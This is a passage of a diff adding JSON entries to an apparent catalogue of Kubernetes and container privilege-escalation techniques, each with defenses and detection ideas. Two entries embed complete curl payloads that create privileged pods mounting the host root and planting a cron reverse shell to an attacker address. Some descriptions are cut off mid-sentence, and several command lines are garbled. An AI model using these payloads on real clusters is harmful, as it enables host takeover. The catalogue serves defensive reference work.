+    "description": "Principle: If the container invokes the environment variables of low-privilege users, attackers tamper with the environment variables to implement privilege escalation. 1.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "Containers should run with the minimum required permissions, and unnecessary environment variables should not be assigned.",
+      "Container deprivileging; restrict privileged containers",
+      "Harden environment variable inheritance; use secure PATH configurations",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "all_pod=`docker ps -q`;for i in $all_pod;do echo start `docker ps |grep $i`;docker exec -it -u root $i /bin/bash -c 'echo $PATH';done",
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Monitor PATH variable modifications; detect environment variable injection",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Container Escape"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox",
+      "Inject malicious binaries into PATH directories for privilege escalation"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.1.5.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Container Command-Line Arguments for Controllable Escape > Exploiting Container Command-Line Parameters for Controllable Escape",
+    "description": "Principle: If an attacker can control the container deployment parameters, the attacker can inject the privileged parameter into the parameters to achieve privilege escalation. 1.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "Ensure that the command-line arguments passed to the container are secure, and avoid executing any malicious commands.",
+      "Container deprivileging; restrict privileged containers",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Container Escape"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.1.6.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Symbolic Links to Achieve Container Escape > Using Symbolic Links to Achieve Container Escape",
+    "description": "Principle: If an attacker can control symbolic links, the attacker can use symbolic links to achieve privilege escalation. Attack mode 1: 1.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "When a container starts, the ability to create symbolic links within the container can be restricted by setting environment variables or using other mechanisms.",
+      "Container deprivileging; restrict privileged containers",
+      "Validate file paths before operations; use atomic operations",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Detect symlink creation in sensitive directories; monitor path traversal attempts",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Container Escape"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox",
+      "Create symbolic link to sensitive file and exploit root process file operations"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.1.7.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting container mounting to escape via http.sock of another container > Exploiting other containers to obtain the token of a pod that has the privilege to create containers, thereby achieving container escape and privilege escalation.",
+    "description": "Principle: If an attacker has the pods (create, update, or patch) resource permission, the attacker can create a privileged container and bounce the shell to escalate the privilege. Attack payload: curl https://<APIServerIP>:<ApiserverPort>/api/v1/namespaces/<namespace>/pods -H \"Authorization:Bearer <token>\" -k -H \"Content-Type: application/json\" -X POST -d '{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"name\":\"evil-pod22\"},\"spec\":{\"containers\":[{\"name\":\"evil-pod22\",\"image\":\"<imageName>\",\"securityContext\":{\"privileged\":true,\"runAsUser\":0,\"runAsGroup\":0},\"command\":[\"/bin/bash\"],\"args\":[\"-c\",\"echo \\u0027* * * * * root bash -c \\u0022/bin/bash -i >& /dev/tcp/<attackerIP>/<attackerPort>0>&1\\u0022\\u0027>> /hostfs/etc/crontab;sleep 666\"],\"volumeMounts\":[{\"mountPath\":\"/hostfs\",\"name\":\"hostfs\"}]}],\"volumes\":[{\"name\":\"hostfs\",\"hostPath\":{\"path\":\"/\"}}]}}'",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Shell Access",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "Ensure that executable scripts within the container run as non-privileged users and do not have the permissions to perform privilege escalation operations.",
+      "Container deprivileging; restrict privileged containers",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Token Manipulation",
+      "Container Escape"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": "https://<APIServerIP>:<ApiserverPort>/api/v1/namespaces/<namespace>/pods",
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.1.8.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Container Mount Vulnerabilities for Escaping > Exploiting the highest OS user privileges without isolation to achieve container escape and privilege escalation.",
+    "description": "Principle: If the container stores sensitive information in the secret, attackers can invoke the APIserver interface to obtain the sensitive information in the secret for privilege escalation. 1.",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "Ensure that executable scripts within the container run as non-privileged users and do not have the permissions to perform privilege escalation operations.",
+      "Container deprivileging; restrict privileged containers",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Container Escape"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": "https://192.167.4.215:8443/apis/aggregation.caas.huawei.com/v1/user",
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.1.8.2",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Container Mount Vulnerabilities for Escaping > Utilizing the same directory mounted across multiple containers, but with unreasonable mounting permissions, enabling container escape and privilege escalation.",
+    "description": "Principle: The same directory is mounted in both the management container and the business container. However, the mounting permissions set for the business container are unreasonable.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "When different types of containers mount the same directory, ensure that the principle of least privilege is implemented based on the business type of the container.",
+      "Container deprivileging; restrict privileged containers",
+      "Audit mounted directories; prohibit sensitive host directory mounts",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Alert on new mount operations from within containers",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Container Escape",
+      "Namespace Manipulation"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.1.9.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Container Mount Vulnerabilities for Escaping > Exploiting other containers to obtain the token of a pod that has the privilege to create containers, thereby achieving container escape and privilege escalation.",
+    "description": "Principle: This token can be used to create a privileged container and bounce the shell to escape from the container to the host machine. Replace curl -k -H \"Content-Type: application/json\" -H \"Authorization: Bearer {with the corresponding token}\" -X POST --data '{\"apiVersion\":\"apps/v1\",\"kind\":\"Deployment\",\"metadata\":{\"name\":\"evilpod3\"},\"spec\":{\"replicas\":1,\"selector\":{\"matchLabels\":{\"app\":\"nginx\"}},\"template\":{\"metadata\":{\"labels\":{\"app\":\"nginx\"}},\"spec\":{\"containers\":[{\"name\":\"nginx\",\"image\":\"registry.caas.local/default/sop_base_image-x86_64:24.20.1710\",\"securityContext\":{\"privileged\":true,\"runAsUser\":0,\"runAsGroup\":0},\"command\":[\"/bin/bash\"],\"args\":[\"-c\",\"echo \\u0027* * * * * root bash -c \\u0022/bin/bash -i >& /dev/tcp/10.118.190.142/3333 0>&1\\u0022\\u0027>> /hostfs/etc/crontab;sleep 666\"],\"volumeMounts\":[{\"mountPath\":\"/hostfs\",\"name\":\"hostfs\"}]}],\"volumes\":[{\"name\":\"hostfs\",\"hostPath\":{\"path\":\"/\"}}]}}}}' https://192.167.4.215:8443/apis/apps/v1/namespaces/sop/deployments",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Shell Access",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "Ensure that executable scripts within the container run as non-privileged users and do not have the permissions to perform privilege escalation operations.",
+      "Container deprivileging; restrict privileged containers",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Token Manipulation",
+      "Container Escape"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": "https://192.167.4.215:8443/apis/apps/v1/namespaces/sop/deployments",
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.2.1.1",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Improper K8s Configuration for Privilege Escalation > Exploiting an API Server with Unauthorized Access for Privilege Escalation",
+    "description": "If the Kubernetes API Server is configured with unauthorized access, attackers can create privileged containers and further exploit them. Principle: If ApiServer does not control the access permission, attackers with low permissions can execute the CR file to construct malicious pods to implement privilege escalation.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Shell Access",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "Unauthorized access to the Kubernetes API Server is prohibited.",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Privilege Escalation"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.2.1.2",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Improper K8s Configuration for Privilege Escalation > Adding User Rights Using Rolebinding",
+    "description": "If the attacker obtains the Role Binding permission, the attacker can add other users to cluster-admin or other high-privilege roles for privilege escalation. Attack method: 1.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "Minimize the permissions of individual pods. 2.",
+      "If there are pods that simultaneously provide external services and perform sensitive operations on the cluster, these pods should be split into low-privilege pods and high-privilege pods. The low-privilege pod should request sensitive operations from the high-privilege pod through internal APIs. This prevents attackers from obtaining high-privilege pods directly after acquiring a pod from the external environment.",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Privilege Escalation"
+    ],
+    "code_examples_patterns": [
+      "Exploit overly permissive RBAC RoleBinding for Kubernetes privilege escalation"
+    ],
+    "related_tools": [],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.2.1.3",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Improper K8s Configuration for Privilege Escalation > Exploiting Unauthorized Access to Kubelet for Privilege Escalation",
+    "description": "Kubelet is a proxy component on a Kubernetes worker node that manages the lifecycle of containers on the node. The main function of Kubelet is to periodically fetch the expected state of pods/containers on a node from somewhere (usually an API server).",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Container Runtime Access",
+      "Network Access"
+    ],
+    "potential_defenses": [
+      "Do not configure Kubelet as unauthorized.",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Privilege Escalation"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.2.1.4",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Improper K8s Configuration for Privilege Escalation > Exploiting Unauthorized Access to the Dashboard for Privilege Escalation",
+    "description": "Dashboard is a web-based Kubernetes user interface for managing applications and resources in a cluster, troubleshooting, and configuration. It provides a visualized way to view the status and performance of a cluster and perform common operations, such as deployment, scaling, update, and deletion.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "Do not set the DashBoard to unauthorized.",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Privilege Escalation"
+    ],
+    "code_examples_patterns": [
+      "Exploit misconfiguration to escalate from user to root privileges"
+    ],
+    "related_tools": [],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.2.1.5",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Improper K8s Configuration for Privilege Escalation > Unauthorized access (containerization) caused by unreasonable design of container RBAC role permissions.",
+    "description": "Inappropriate role permission design for the role-based access control (RBAC) of the container may cause unauthorized access. An attacker could exploit these vulnerabilities to gain unauthorized access and exploit or abuse the container environment.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "Proper use of RBAC permissions",
+      "Container deprivileging; restrict privileged containers",
+      "Implement least-privilege RBAC; audit role permissions regularly",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Monitor RoleBinding and ClusterRoleBinding creation/modification events",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Container Escape"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox",
+      "Exploit overly permissive RBAC RoleBinding for Kubernetes privilege escalation"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.2.1.6",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Improper K8s Configuration for Privilege Escalation > Exploiting container mounting of containerd.sock for privilege escalation",
+    "description": "Principle: If containerd.sock is mounted to a container, an attacker can run the crictl command in the container to escalate privilege. 1. Run the all_pod=`crictl ps command. grep -v NAME awk -F '''{print $1}'`;for i in $all_pod;do echo start `crictl ps grep $i`;crictl exec -ti $i find / -name \"containerd.sock\" -type f xargs ls -la 2>/dev/null;done 2. Check whether containerd.sock is mounted to the container based on the scanning result. Enter the containerd.sock and run the Containerd command",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "Do not mount the containerd.sock file in the container.",
+      "Container deprivileging; restrict privileged containers",
+      "Audit mounted directories; prohibit sensitive host directory mounts",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Alert on new mount operations from within containers",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "DLL Hijacking",
+      "Container Escape",
+      "Namespace Manipulation"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox",
+      "Inject malicious shared library via /etc/ld.so.preload for root execution"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.2.1.7",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Improper K8s Configuration for Privilege Escalation > Propagating Shared Patterns Using Container Mounts",
+    "description": "1. Run the `crictl ps -a` command to view all container IDs running on the current host.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "Do not set the mount mode inside the container to shared mode.",
+      "Container deprivileging; restrict privileged containers",
+      "Audit mounted directories; prohibit sensitive host directory mounts",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Alert on new mount operations from within containers",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Container Escape",
+      "Namespace Manipulation"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.2.1.8",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Improper K8s Configuration for Privilege Escalation > Using Containers to Share Host's IPC Namespace",
+    "description": "1. Run the `crictl ps -a` command to view the IDs of all containers running on the current host.",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container",
+      "Linux",
+      "Android"
+    ],
+    "resource_required": [
+      "Container Runtime Access",
+      "Network Access"
+    ],
+    "potential_defenses": [
+      "Containers should not share the host's IPC namespace.",
+      "Container deprivileging; restrict privileged containers",
+      "Validate IPC message formats; enforce access controls on IPC channels",
+      "Isolate container namespaces; avoid sharing host namespaces",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Monitor IPC channel creation and message patterns for anomalies",
+      "Detect namespace sharing violations; monitor PID/NET namespace access",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Container Escape",
+      "Namespace Manipulation",
+      "IPC Exploitation"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox",
+      "Exploit IPC channel with insufficient validation to escalate privileges",
+      "Manipulate cgroup release_agent or namespace configuration for container escape"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.2.1.9",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Improper K8s Configuration for Privilege Escalation > Using Containers to Share Host Process Namespaces",
+    "description": "1. Run the `crictl ps -a` command to view all container IDs running on the current host. 2. Run the `crictl inspect container ID` command to view container details. 3. Run the `grep' \"pid\": 2'` command to check whether the container shares the process namespace with the host. Run the all_pod=`crictl ps command in batches. grep -v NAME awk-F '''{print $1}'`;for i in $all_pod;do echo start check `crictl ps grep $i`",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "Containers should not share the host's process namespace.",
+      "Container deprivileging; restrict privileged containers",
+      "Isolate container namespaces; avoid sharing host namespaces",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Detect namespace sharing violations; monitor PID/NET namespace access",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Container Escape",
+      "Namespace Manipulation"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox",
+      "Manipulate cgroup release_agent or namespace configuration for container escape"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.2.1.10",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Improper K8s Configuration for Privilege Escalation > Using Containers to Share Host's UTS Namespace",
+    "description": "1. Run the `crictl ps -a` command to view the IDs of all containers running on the current host. 2. Run the `crictl inspect < container ID > ` command to view the container details. 3. Run the `grep' \"pid\": 2'` command to check whether the container shares the process namespace with the host. Run the all_pod=`crictl ps command in batches. grep -v NAME awk-F '''{print $1}'`;for i in $all_pod;do echo start check `crictl ps grep $i`; crictl inspect $i grep -A 1 -i '\\\"type\\\": \\\"uts\\\"'; done",
+    "attack_complexity": "High",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "Containers do not share the UTS namespace of the host.",
+      "Container deprivileging; restrict privileged containers",
+      "Isolate container namespaces; avoid sharing host namespaces",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Detect namespace sharing violations; monitor PID/NET namespace access",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Container Escape",
+      "Namespace Manipulation"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox",
+      "Manipulate cgroup release_agent or namespace configuration for container escape"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.2.1.11",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Improper K8s Configuration for Privilege Escalation > Host-Referenced Resources Are Modified by Users Inside the Container, Leading to Container Escape",
+    "description": "1. Execute `crictl inspect CONTAINERID` within the node to obtain the container's mount status.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "The resource permissions referenced by the container must meet the specifications.",
+      "Container deprivileging; restrict privileged containers",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Container Escape"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": null,
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.2.1.12",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Improper K8s Configuration for Privilege Escalation > Exploiting container RBAC role permissions to configure an update to the deployments resource for privilege escalation.",
+    "description": "If an attacker has the deployments[creat/update/patch] resource permission, the attacker can invoke the APIserver interface to create a privileged container, mount the host directory, run the host as the root user, and bounce the shell to obtain the root permission of the host. 1.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Shell Access",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "It is necessary to control the scope of RBAC role control.",
+      "Container deprivileging; restrict privileged containers",
+      "Implement least-privilege RBAC; audit role permissions regularly",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Monitor RoleBinding and ClusterRoleBinding creation/modification events",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Container Escape"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox",
+      "Exploit overly permissive RBAC RoleBinding for Kubernetes privilege escalation"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
+      "Docker",
+      "crictl"
+    ],
+    "url": "https://<APIServerIP>:<ApiserverPort>/apis/apps/v1/namespaces/<namespace>/deployments",
+    "is_atlas": false
+  },
+  {
+    "technique_id": "C4.2.1.13",
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "technique_name": "Exploiting Improper K8s Configuration for Privilege Escalation > Exploiting container RBAC role permissions to configure the creation of DaemonSet resources for privilege escalation.",
+    "description": "If an attacker has the daemonSet.app[creat/update/patch] resource permission, the attacker can invoke the APIserver interface to create a privileged container, mount the host directory, run the host as the root user, and bounce the shell to obtain the root permission of the host. 1.",
+    "attack_complexity": "Low",
+    "privileges_required": "User",
+    "execution_context": [
+      "Cloud",
+      "Container"
+    ],
+    "resource_required": [
+      "Exploit Code",
+      "Shell Access",
+      "Container Runtime Access"
+    ],
+    "potential_defenses": [
+      "It is necessary to control the scope of RBAC role control.",
+      "Container deprivileging; restrict privileged containers",
+      "Implement least-privilege RBAC; audit role permissions regularly",
+      "Application control and whitelisting",
+      "Regular security audits and vulnerability scanning"
+    ],
+    "detection_opportunities": [
+      "Monitor container runtime for escape attempts; detect privileged container creation",
+      "Monitor RoleBinding and ClusterRoleBinding creation/modification events",
+      "Monitor security event logs for privilege change events",
+      "Detect unusual process parent-child relationships",
+      "Alert on token manipulation API calls"
+    ],
+    "exploit_primitives": [
+      "Container Escape"
+    ],
+    "code_examples_patterns": [
+      "Mount host filesystem from privileged container to escape sandbox",
+      "Exploit overly permissive RBAC RoleBinding for Kubernetes privilege escalation"
+    ],
+    "related_tools": [
+      "CloudAutoDeploy-CDK",
